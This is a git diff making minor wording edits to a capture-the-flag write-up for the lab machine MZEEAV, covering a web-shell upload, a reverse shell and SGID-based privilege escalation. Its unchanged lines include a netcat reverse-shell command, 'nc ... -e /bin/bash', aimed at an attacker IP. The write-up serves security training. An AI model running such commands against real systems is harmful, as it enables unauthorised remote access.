@@ -428,7 +428,7 @@ Then we upload the `web_shell_fixed.php` file:
 
 ![MZEEAV Upload 3](Images/MZEEAV_Upload_3.png)
 
-We can then verify the web shell with `curl`:
+We can verify the web shell with `curl`:
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/MZEEAV]
@@ -441,7 +441,7 @@ Success!
 
 ### Prepare a reverse shell
 
-We want to upload a bash reverse shell. An URL-encoded version of
+We want to upload a reverse shell. An URL-encoded version of
 
 ```bash
 nc 192.168.45.241 12345 -e /bin/bash
@@ -505,7 +505,7 @@ www-data@mzeeav:/var/www/html/upload$
 
 ### Enumeration for privesc
 
-Now it's time to search for privilege escalation oppurtunities. We loosely follow my [Linux PrivEsc Checklist](https://cajac.gitbook.io/ctf-notes/priv-esc/linux-privilege-escalation/linux-privesc-checklist) for this.
+It's time to search for privilege escalation oppurtunities. We loosely follow my [Linux PrivEsc Checklist](https://cajac.gitbook.io/ctf-notes/priv-esc/linux-privilege-escalation/linux-privesc-checklist) for this.
 
 Searching for SGID-files, we find an unusual file in the `/opt` directory:
 
@@ -574,7 +574,7 @@ you have no web access, by sending email to <bug-findutils@gnu.org>.
 www-data@mzeeav:/home/avuser$ 
 ```
 
-This seems to something very similar to `find`!
+This seems to be something very similar to `find`!
 
 ### Get a root shell
 
